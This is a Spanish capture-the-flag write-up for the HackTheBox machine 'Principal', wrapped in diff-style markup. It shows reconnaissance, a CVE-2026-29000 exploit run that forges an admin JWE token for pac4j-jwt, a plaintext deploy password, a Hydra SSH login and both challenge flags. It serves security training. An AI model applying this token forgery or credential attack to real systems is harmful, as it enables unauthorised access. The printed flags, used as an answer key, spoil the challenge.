+❯ ping -c1 10.129.30.182 PING 10.129.30.182 (10.129.30.182) 56(84) bytes of data. 64 bytes from 10.129.30.182: icmp_seq=1 ttl=63 time=450 ms TTL de 63 — casi con certeza es un Linux. Procedemos con un escaneo de puertos agresivo:"><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-06-19T00:00:00+00:00"><meta property="article:modified_time" content="2026-06-19T00:00:00+00:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Medium"><meta property="article:tag" content="HackTheBox"><meta property="article:tag" content="Pac4j-Jwt"><meta property="article:tag" content="SSH CA"><meta property="og:see_also" content="https://justgr0w.github.io/posts/fireflow/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/abducted/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/variatype/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/snapped/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/cap/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/puppy/"><link rel=canonical href=https://justgr0w.github.io/posts/principal/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.022594d625780e2edf64581b893d32cb35c11de5d88953ea4ad3c2e45451e214.css integrity="sha256-AiWU1iV4Di7fZFgbiT0yyzXBHeXYiVPqStPC5FRR4hQ=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=https://justgr0w.github.io/>0xjustgr0w
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/contact/>Sobre mí</a></li><li class=navigation-item><a class=navigation-link href=/posts/>Blog</a></li><li class=navigation-item><a class=navigation-link href=/projects/>Proyectos</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://justgr0w.github.io/posts/principal/>Principal</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
+<time datetime=2026-06-19T00:00:00Z>junio 19, 2026
+</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
+8 minutos de lectura.</span></div><div class=authors><i class="fa-solid fa-user" aria-hidden=true></i>
+<a href=/authors/0xjustgr0w/>0xjustgr0w</a></div><div class=categories><i class="fa-solid fa-folder" aria-hidden=true></i>
+<a href=/categories/pentesting/>Pentesting</a></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
+<span class=tag><a href=/tags/ctf/>CTF</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/medium/>Medium</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/hackthebox/>HackTheBox</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/pac4j-jwt/>Pac4j-Jwt</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/ssh-ca/>SSH CA</a></span></div></div></header><div class=post-content><h1 id=principal--intrusión-completa>Principal — Intrusión Completa
+<a class=heading-link href=#principal--intrusi%c3%b3n-completa><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h1><p><img src=/images/posts/principal/target.png alt></p><p><strong>Dificultad</strong>: <em>Medium</em></p><p><strong>Plataforma</strong>: <em>HackTheBox</em></p><p><strong>Flags</strong>: <code>0f556e2c6de811d6afe3be60c3654a8e</code> (user) / <code>fe347d72e5fb53a7386c23dfab4c1b4f</code> (root)</p><hr><h2 id=reconocimiento>Reconocimiento
+<a class=heading-link href=#reconocimiento><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><h3 id=descubrimiento-de-puertos>Descubrimiento de puertos
+<a class=heading-link href=#descubrimiento-de-puertos><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Comenzamos con un ping para verificar conectividad y estimar el sistema operativo basándonos en el TTL:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>❯</span> <span class=n>ping</span> <span class=o>-</span><span class=n>c1</span> <span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>30</span><span class=o>.</span><span class=mi>182</span>
+</span></span><span class=line><span class=cl><span class=no>PING</span> <span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>30</span><span class=o>.</span><span class=mi>182</span> <span class=p>(</span><span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>30</span><span class=o>.</span><span class=mi>182</span><span class=p>)</span> <span class=mi>56</span><span class=p>(</span><span class=mi>84</span><span class=p>)</span> <span class=n>bytes</span> <span class=n>of</span> <span class=n>data</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>64</span> <span class=n>bytes</span> <span class=n>from</span> <span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>30</span><span class=o>.</span><span class=mi>182</span><span class=p>:</span> <span class=n>icmp_seq</span><span class=o>=</span><span class=mi>1</span> <span class=n>ttl</span><span class=o>=</span><span class=mi>63</span> <span class=n>time</span><span class=o>=</span><span class=mi>450</span> <span class=n>ms</span></span></span></code></pre></div><p>TTL de 63 — casi con certeza es un Linux. Procedemos con un escaneo de puertos agresivo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>❯</span> <span class=n>nmap</span> <span class=o>-</span><span class=nb>p</span><span class=o>-</span> <span class=o>--</span><span class=nb>open</span> <span class=o>-</span><span class=n>sS</span> <span class=o>--</span><span class=n>min</span><span class=o>-</span><span class=n>rate</span> <span class=mi>5000</span> <span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>30</span><span class=o>.</span><span class=mi>182</span> <span class=o>-</span><span class=n>oG</span> <span class=n>nmap</span><span class=o>/</span><span class=n>targeted</span> <span class=o>-</span><span class=n>n</span> <span class=o>-</span><span class=no>Pn</span>
+</span></span><span class=line><span class=cl><span class=no>Starting</span> <span class=no>Nmap</span> <span class=mi>7</span><span class=o>.</span><span class=mi>99</span> <span class=p>(</span> <span class=ss>https</span><span class=p>:</span><span class=sr>//nm</span><span class=n>ap</span><span class=o>.</span><span class=n>org</span> <span class=p>)</span> <span class=n>at</span> <span class=mi>2026</span><span class=o>-</span><span class=mo>06</span><span class=o>-</span><span class=mi>18</span> <span class=mi>16</span><span class=p>:</span><span class=mi>49</span> <span class=o>-</span><span class=mo>0400</span>
+</span></span><span class=line><span class=cl><span class=no>Nmap</span> <span class=nb>scan</span> <span class=n>report</span> <span class=k>for</span> <span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>30</span><span class=o>.</span><span class=mi>182</span>
+</span></span><span class=line><span class=cl><span class=no>Host</span> <span class=n>is</span> <span class=n>up</span> <span class=p>(</span><span class=mi>0</span><span class=o>.</span><span class=mi>48</span><span class=n>s</span> <span class=n>latency</span><span class=p>)</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=no>Not</span> <span class=ss>shown</span><span class=p>:</span> <span class=mi>48905</span> <span class=n>closed</span> <span class=n>tcp</span> <span class=n>ports</span> <span class=p>(</span><span class=n>reset</span><span class=p>),</span> <span class=mi>16628</span> <span class=n>filtered</span> <span class=n>tcp</span> <span class=n>ports</span> <span class=p>(</span><span class=n>no</span><span class=o>-</span><span class=n>response</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=no>PORT</span>     <span class=no>STATE</span> <span class=no>SERVICE</span>
+</span></span><span class=line><span class=cl><span class=mi>22</span><span class=o>/</span><span class=n>tcp</span>   <span class=nb>open</span>  <span class=n>ssh</span>
+</span></span><span class=line><span class=cl><span class=mi>8080</span><span class=o>/</span><span class=n>tcp</span> <span class=nb>open</span>  <span class=n>http</span><span class=o>-</span><span class=n>proxy</span></span></span></code></pre></div><p>Solo dos puertos abiertos: <strong>SSH (22)</strong> y un <strong>HTTP proxy (8080)</strong>. Vamos a profunzidar en los servicios:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>❯</span> <span class=n>nmap</span> <span class=o>-</span><span class=n>p22</span><span class=p>,</span><span class=mi>8080</span> <span class=o>-</span><span class=n>sCV</span> <span class=o>-</span><span class=n>oN</span> <span class=n>nmap</span><span class=o>/</span><span class=n>targeted</span> <span class=o>-</span><span class=n>n</span> <span class=o>-</span><span class=no>Pn</span> <span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>30</span><span class=o>.</span><span class=mi>182</span>
+</span></span><span class=line><span class=cl><span class=no>Nmap</span> <span class=nb>scan</span> <span class=n>report</span> <span class=k>for</span> <span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>30</span><span class=o>.</span><span class=mi>182</span>
+</span></span><span class=line><span class=cl><span class=no>Host</span> <span class=n>is</span> <span class=n>up</span> <span class=p>(</span><span class=mi>0</span><span class=o>.</span><span class=mi>27</span><span class=n>s</span> <span class=n>latency</span><span class=p>)</span><span class=o>.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=no>PORT</span>     <span class=no>STATE</span> <span class=no>SERVICE</span>    <span class=no>VERSION</span>
+</span></span><span class=line><span class=cl><span class=mi>22</span><span class=o>/</span><span class=n>tcp</span>   <span class=nb>open</span>  <span class=n>ssh</span>        <span class=no>OpenSSH</span> <span class=mi>9</span><span class=o>.</span><span class=mi>6</span><span class=n>p1</span> <span class=no>Ubuntu</span> <span class=mi>3</span><span class=n>ubuntu13</span><span class=o>.</span><span class=mi>14</span>
+</span></span><span class=line><span class=cl><span class=mi>8080</span><span class=o>/</span><span class=n>tcp</span> <span class=nb>open</span>  <span class=n>http</span><span class=o>-</span><span class=n>proxy</span> <span class=no>Jetty</span>
+</span></span><span class=line><span class=cl><span class=o>|</span><span class=n>_http</span><span class=o>-</span><span class=ss>title</span><span class=p>:</span> <span class=no>Principal</span> <span class=no>Internal</span> <span class=no>Platform</span> <span class=o>-</span> <span class=no>Login</span>
+</span></span><span class=line><span class=cl><span class=o>|</span><span class=n>_http</span><span class=o>-</span><span class=n>server</span><span class=o>-</span><span class=ss>header</span><span class=p>:</span> <span class=no>Jetty</span>
+</span></span><span class=line><span class=cl><span class=o>|</span><span class=n>_http</span><span class=o>-</span><span class=nb>open</span><span class=o>-</span><span class=ss>proxy</span><span class=p>:</span> <span class=no>Proxy</span> <span class=n>might</span> <span class=n>be</span> <span class=n>redirecting</span> <span class=n>requests</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>X</span><span class=o>-</span><span class=no>Powered</span><span class=o>-</span><span class=ss>By</span><span class=p>:</span> <span class=n>pac4j</span><span class=o>-</span><span class=n>jwt</span><span class=o>/</span><span class=mi>6</span><span class=o>.</span><span class=mi>0</span><span class=o>.</span><span class=mi>3</span></span></span></code></pre></div><p>Interesante — <strong>Jetty</strong> (servidor Java) con <strong>pac4j-jwt/6.0.3</strong> como motor de autenticación. Agregamos el host a <code>/etc/hosts</code> y exploramos el portal:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>❯</span> <span class=n>echo</span> <span class=o>-</span><span class=n>e</span> <span class=s2>&#34;10.129.30.182</span><span class=se>\t\t</span><span class=s2>principal.htb&#34;</span> <span class=o>|</span> <span class=n>sudo</span> <span class=n>tee</span> <span class=o>-</span><span class=n>a</span> <span class=sr>/etc/</span><span class=n>hosts</span></span></span></code></pre></div><h3 id=reconocimiento-del-portal-web>Reconocimiento del portal web
+<a class=heading-link href=#reconocimiento-del-portal-web><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>❯</span> <span class=n>whatweb</span> <span class=ss>http</span><span class=p>:</span><span class=sr>//</span><span class=n>principal</span><span class=o>.</span><span class=n>htb</span><span class=p>:</span><span class=mi>8080</span>
+</span></span><span class=line><span class=cl><span class=ss>http</span><span class=p>:</span><span class=sr>//</span><span class=n>principal</span><span class=o>.</span><span class=n>htb</span><span class=p>:</span><span class=mi>8080</span> <span class=o>[</span><span class=mi>302</span> <span class=no>Found</span><span class=o>]</span> <span class=no>RedirectLocation</span><span class=o>[</span><span class=sr>/login], X-Powered-By[pac4j-jwt/</span><span class=mi>6</span><span class=o>.</span><span class=mi>0</span><span class=o>.</span><span class=mi>3</span><span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=ss>http</span><span class=p>:</span><span class=sr>//</span><span class=n>principal</span><span class=o>.</span><span class=n>htb</span><span class=p>:</span><span class=mi>8080</span><span class=o>/</span><span class=n>login</span> <span class=o>[</span><span class=mi>200</span> <span class=no>OK</span><span class=o>]</span> <span class=no>Title</span><span class=o>[</span><span class=no>Principal</span> <span class=no>Internal</span> <span class=no>Platform</span> <span class=o>-</span> <span class=no>Login</span><span class=o>]</span><span class=p>,</span> <span class=no>PasswordField</span><span class=o>[</span><span class=n>password</span><span class=o>]</span><span class=p>,</span> <span class=no>PoweredBy</span><span class=o>[</span><span class=n>pac4j</span><span class=o>]</span></span></span></code></pre></div><p><img src=/images/posts/principal/Principal%20Login.png alt></p><p>Nos encontramos con un formulario de login de una plataforma interna llamada <strong>&ldquo;Principal Internal Platform&rdquo;</strong>. Probamos opciones básicas como SQLi, credenciales por defecto (admin:admin, admin:password), pero nada funciona. El botón de &ldquo;Forgot password?&rdquo; nos lleva a una página que dice que la función de reseteo <strong>no está implementada</strong>:</p><p><img src=/images/posts/principal/reset%20password%20not%20implemented.png alt></p><p>Esto nos da una pista: si no hay reseteo de contraseña, probablemente el sistema espera que las credenciales sean gestionadas por un administrador. Pero antes de rendirnos, revisamos el código fuente de la página y encontramos algo mucho más interesante.</p><h3 id=análisis-del-javascript>Análisis del JavaScript
+<a class=heading-link href=#an%c3%a1lisis-del-javascript><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>En el archivo <code>/static/js/app.js</code> descubrimos los endpoints de la API y, crucialmente, <strong>cómo funciona el sistema de autenticación</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm> * Principal Internal Platform - Client Application
+</span></span></span><span class=line><span class=cl><span class=cm> * Version: 1.2.0
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm> * Authentication flow:
+</span></span></span><span class=line><span class=cl><span class=cm> * 1. User submits credentials to /api/auth/login
+</span></span></span><span class=line><span class=cl><span class=cm> * 2. Server returns encrypted JWT (JWE) token
+</span></span></span><span class=line><span class=cl><span class=cm> * 3. Token is stored and sent as Bearer token for subsequent requests
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm> * Token handling:
+</span></span></span><span class=line><span class=cl><span class=cm> * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
+</span></span></span><span class=line><span class=cl><span class=cm> * - Public key available at /api/auth/jwks for token verification
+</span></span></span><span class=line><span class=cl><span class=cm> * - Inner JWT is signed with RS256
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm> * JWT claims schema:
+</span></span></span><span class=line><span class=cl><span class=cm> *   sub   - username
+</span></span></span><span class=line><span class=cl><span class=cm> *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
+</span></span></span><span class=line><span class=cl><span class=cm> *   iss   - &#34;principal-platform&#34;
+</span></span></span><span class=line><span class=cl><span class=cm> *   iat   - issued at (epoch)
+</span></span></span><span class=line><span class=cl><span class=cm> *   exp   - expiration (epoch)
+</span></span></span><span class=line><span class=cl><span class=cm> */</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>API_BASE</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>JWKS_ENDPOINT</span> <span class=o>=</span> <span class=s1>&#39;/api/auth/jwks&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>AUTH_ENDPOINT</span> <span class=o>=</span> <span class=s1>&#39;/api/auth/login&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>DASHBOARD_ENDPOINT</span> <span class=o>=</span> <span class=s1>&#39;/api/dashboard&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>USERS_ENDPOINT</span> <span class=o>=</span> <span class=s1>&#39;/api/users&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>SETTINGS_ENDPOINT</span> <span class=o>=</span> <span class=s1>&#39;/api/settings&#39;</span><span class=p>;</span>
+</span></span></code></pre></div><p>Esto es oro puro. Sabemos que:</p><ul><li>Usa <strong>JWE</strong> (JSON Web Encryption) con <strong>RSA-OAEP-256</strong> y <strong>A128GCM</strong></li><li>La clave pública está disponible en <code>/api/auth/jwks</code></li><li>Los roles posibles son <code>ROLE_ADMIN</code>, <code>ROLE_MANAGER</code>, <code>ROLE_USER</code></li><li>El endpoint <code>/api/users</code> lista usuarios (requiere autenticación)</li><li>El endpoint <code>/api/settings</code> contiene ajustes de configuración</li></ul><p>Verificamos que los endpoints requieren autenticación:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>❯</span> <span class=n>curl</span> <span class=o>-</span><span class=n>s</span> <span class=ss>http</span><span class=p>:</span><span class=sr>//</span><span class=n>principal</span><span class=o>.</span><span class=n>htb</span><span class=p>:</span><span class=mi>8080</span><span class=o>/</span><span class=n>api</span><span class=o>/</span><span class=n>users</span> <span class=o>-</span><span class=n>i</span>
+</span></span><span class=line><span class=cl><span class=no>HTTP</span><span class=o>/</span><span class=mi>1</span><span class=o>.</span><span class=mi>1</span> <span class=mi>401</span> <span class=no>Unauthorized</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;error&#34;</span><span class=ss>:&#34;Unauthorized&#34;</span><span class=p>,</span><span class=s2>&#34;message&#34;</span><span class=ss>:&#34;Bearer token required&#34;</span><span class=p>}</span></span></span></code></pre></div><p>Sin token no podemos hacer nada. Es momento de buscar vulnerabilidades en <strong>pac4j-jwt 6.0.3</strong>.</p><hr><h2 id=explotación>Explotación
+<a class=heading-link href=#explotaci%c3%b3n><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><h3 id=cve-2026-29000--inyección-plainjwt-en-jwe>CVE-2026-29000 — Inyección PlainJWT en JWE
+<a class=heading-link href=#cve-2026-29000--inyecci%c3%b3n-plainjwt-en-jwe><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Investigando la versión <code>pac4j-jwt/6.0.3</code>, encontramos que es vulnerable a <strong>CVE-2026-29000</strong> con un CVSS de <strong>10.0</strong>. La vulnerabilidad permite inyectar un JWT sin firmar (PlainJWT) dentro de un JWE cifrado, de modo que el servidor confía en el contenido del token interno sin verificar la firma.</p><p>El PoC es claro: el atacante obtiene la clave pública JWKS, construye un JWE con un payload JWT malicioso (cambiando el rol a <code>ROLE_ADMIN</code>), y el servidor lo acepta porque la vulnerabilidad impide la verificación correcta del encadenamiento JWT-dentro-de-JWE.</p><p>Ejecutamos el exploit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>❯</span> <span class=n>python</span> <span class=no>CVE</span><span class=o>-</span><span class=mi>2026</span><span class=o>-</span><span class=mi>29000</span><span class=o>.</span><span class=n>py</span> <span class=o>--</span><span class=n>url</span> <span class=ss>http</span><span class=p>:</span><span class=sr>//</span><span class=n>principal</span><span class=o>.</span><span class=n>htb</span><span class=p>:</span><span class=mi>8080</span><span class=o>/</span> <span class=o>--</span><span class=n>jwks</span> <span class=sr>/api/</span><span class=n>auth</span><span class=o>/</span><span class=n>jwks</span> <span class=o>--</span><span class=n>enc</span> <span class=no>A128GCM</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=err>██████╗██╗</span>   <span class=err>██╗███████╗</span>    <span class=err>██████╗</span>  <span class=err>██████╗</span> <span class=err>██████╗</span>  <span class=err>██████╗</span>
+</span></span><span class=line><span class=cl> <span class=err>██╔════╝██║</span>   <span class=err>██║██╔════╝</span>    <span class=err>╚════██╗██╔═══██╗╚════██╗██╔════╝</span>
+</span></span><span class=line><span class=cl> <span class=err>██║</span>     <span class=err>██║</span>   <span class=err>██║█████╗█████╗</span> <span class=err>█████╔╝██║</span>   <span class=err>██║</span> <span class=err>█████╔╝███████╗</span>
+</span></span><span class=line><span class=cl> <span class=err>██║</span>     <span class=err>╚██╗</span> <span class=err>██╔╝██╔══╝╚════╝██╔═══╝</span> <span class=err>██║</span>   <span class=err>██║██╔═══╝</span> <span class=err>██╔══██║</span>
+</span></span><span class=line><span class=cl> <span class=err>╚██████╗</span> <span class=err>╚████╔╝</span> <span class=err>███████╗</span>    <span class=err>███████╗╚██████╔╝███████╗╚██████╔╝</span>
+</span></span><span class=line><span class=cl>  <span class=err>╚═════╝</span>  <span class=err>╚═══╝</span>  <span class=err>╚══════╝</span>    <span class=err>╚══════╝</span> <span class=err>╚═════╝</span> <span class=err>╚══════╝</span> <span class=err>╚═════╝</span>
+</span></span><span class=line><span class=cl>    <span class=n>pac4j</span><span class=o>-</span><span class=n>jwt</span> <span class=no>PlainJWT</span><span class=o>-</span><span class=k>in</span><span class=o>-</span><span class=no>JWE</span>  <span class=o>|</span>  <span class=vg>$tr</span><span class=o>!</span><span class=n>k0d3r</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[*]</span> <span class=no>Target</span> <span class=p>:</span> <span class=ss>http</span><span class=p>:</span><span class=sr>//</span><span class=n>principal</span><span class=o>.</span><span class=n>htb</span><span class=p>:</span><span class=mi>8080</span>
+</span></span><span class=line><span class=cl><span class=o>[+]</span> <span class=no>Forged</span> <span class=no>JWE</span> <span class=ss>token</span><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=n>eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJlbmMiOiJBMTI4R0NNIiwiY3R5IjoiSldUIiwia2lkIjoiZW5jLWtleS0xIn0</span><span class=o>...</span></span></span></code></pre></div><p>Obtenemos un token JWE forjado. Lo usamos para acceder a la plataforma como <strong>administrador</strong>.</p><h3 id=reconocimiento-interno-con-acceso-de-administrador>Reconocimiento interno con acceso de administrador
+<a class=heading-link href=#reconocimiento-interno-con-acceso-de-administrador><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Con el token de administrador, comenzamos a explorar los endpoints protegidos.</p><p><strong>Listado de usuarios — <code>/api/users</code>:</strong></p><p><img src=/images/posts/principal/usernames.png alt></p><p>Descubrimos los siguientes usuarios registrados en la plataforma:</p><pre tabindex=0><code>jthompson
 amorales
 bwright
 kkumar
@@ -410,323 +139,64 @@ mwilson
 lzhang
 svc-deploy
 admin
-</code></pre><p>Todos parecen ser empleados o cuentas de servicio. El usuario <code>svc-deploy</code> llama la atención por su nomenclatura —parece una cuenta de servicio de despliegue— y <code>admin</code> es el obvio objetivo de escalada.</p>
-<p><strong>Settings — <code>/api/settings</code>:</strong></p>
-<p><img src="/images/posts/principal/discovering%20a%20password%20from%20settings.png" alt=""></p>
-<p>En la sección de ajustes encontramos algo que no debería estar ahí: <strong>una contraseña en texto plano</strong>. Alguien configuró credenciales de despliegue directamente en los settings de la aplicación:</p>
-<p><strong>Usuario</strong>: <code>svc-deploy</code>
-<strong>Password</strong>: <code>D3pl0y_$$H_Now42!</code></p>
-<h3 id="ssh--acceso-inicial-al-sistema">
-  SSH — Acceso inicial al sistema
-  <a class="heading-link" href="#ssh--acceso-inicial-al-sistema">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<p>Con estas credenciales probamos suerte contra el servicio SSH. Usamos Hydra con los usuarios enumerados y la contraseña descubierta:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">hydra</span> <span class="o">-</span><span class="n">L</span> <span class="n">users</span> <span class="o">-</span><span class="n">P</span> <span class="n">passwords</span> <span class="ss">ssh</span><span class="p">:</span><span class="sr">//</span><span class="n">principal</span><span class="o">.</span><span class="n">htb</span>
-</span></span><span class="line"><span class="cl"><span class="no">Hydra</span> <span class="n">v9</span><span class="o">.</span><span class="mi">7</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2023</span> <span class="n">by</span> <span class="n">van</span> <span class="no">Hauser</span><span class="o">/</span><span class="no">THC</span> <span class="o">&amp;</span> <span class="no">David</span> <span class="no">Maciejak</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="mi">22</span><span class="o">][</span><span class="n">ssh</span><span class="o">]</span> <span class="ss">host</span><span class="p">:</span> <span class="n">principal</span><span class="o">.</span><span class="n">htb</span>   <span class="ss">login</span><span class="p">:</span> <span class="n">svc</span><span class="o">-</span><span class="n">deploy</span>   <span class="ss">password</span><span class="p">:</span> <span class="no">D3pl0y_</span><span class="vg">$$</span><span class="no">H_Now42</span><span class="o">!</span>
-</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="n">of</span> <span class="mi">1</span> <span class="n">target</span> <span class="n">successfully</span> <span class="n">completed</span><span class="p">,</span> <span class="mi">1</span> <span class="n">valid</span> <span class="n">password</span> <span class="n">found</span></span></span></code></pre></div>
-<p><strong>¡Acceso concedido!</strong> La cuenta <code>svc-deploy</code> reutiliza la contraseña encontrada en los settings. Nos conectamos por SSH:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">svc</span><span class="o">-</span><span class="n">deploy</span><span class="vi">@principal</span><span class="ss">:~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
-</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="n">f556e2c6de811d6afe3be60c3654a8e</span></span></span></code></pre></div>
-<p>Primera flag capturada. Ahora comenzamos la fase de escalada de privilegios.</p>
-<hr>
-<h2 id="escalada-de-privilegios">
-  Escalada de Privilegios
-  <a class="heading-link" href="#escalada-de-privilegios">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<h3 id="enumeración-del-sistema">
-  Enumeración del sistema
-  <a class="heading-link" href="#enumeraci%c3%b3n-del-sistema">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<p>Lo primero: ¿quién soy y qué permisos tengo?</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">svc</span><span class="o">-</span><span class="n">deploy</span><span class="vi">@principal</span><span class="ss">:~</span><span class="err">$</span> <span class="nb">id</span>
-</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">svc</span><span class="o">-</span><span class="n">deploy</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">svc</span><span class="o">-</span><span class="n">deploy</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">svc</span><span class="o">-</span><span class="n">deploy</span><span class="p">),</span><span class="mi">1001</span><span class="p">(</span><span class="n">deployers</span><span class="p">)</span></span></span></code></pre></div>
-<p>El usuario pertenece al grupo <code>deployers</code>. Esto es inusual y merece investigación. Buscamos archivos accesibles por este grupo:</p>
